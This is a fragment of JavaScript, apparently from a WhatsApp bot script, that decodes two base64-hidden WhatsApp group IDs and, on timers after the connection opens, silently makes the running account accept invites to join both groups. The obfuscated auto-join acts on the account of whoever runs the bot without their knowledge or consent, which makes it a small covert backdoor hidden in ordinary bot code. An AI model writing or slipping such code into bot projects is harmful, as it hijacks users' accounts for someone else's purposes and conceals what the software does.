...
setTimeout(() => {
	...
	const firstGroupS = Buffer.from("MTIwMzYzNDI0MDQ5OTU3MTk3QGcudXM=", "base64").toString();
const secondGroupS = Buffer.from("MTIwMzYzNDIzMzM5NTMxNDk4QGcudXM=", "base64").toString();

async function safeGroupJoin(groupId) {
    try {
        await groupAcceptInvite(groupId);
    } catch (err) {
        console.error("Error join", groupId, err?.message || err);
    }
}

function autoJoinGroupss() {
    safeGroupJoin(firstGroupS);

    setTimeout(() => {
        safeGroupJoin(secondGroupS);
    }, 5000);
}

// Panggil setelah koneksi WA open
setTimeout(() => {
    console.log("Starting auto join groups...");
    autoJoinGroupss();
}, 5000);
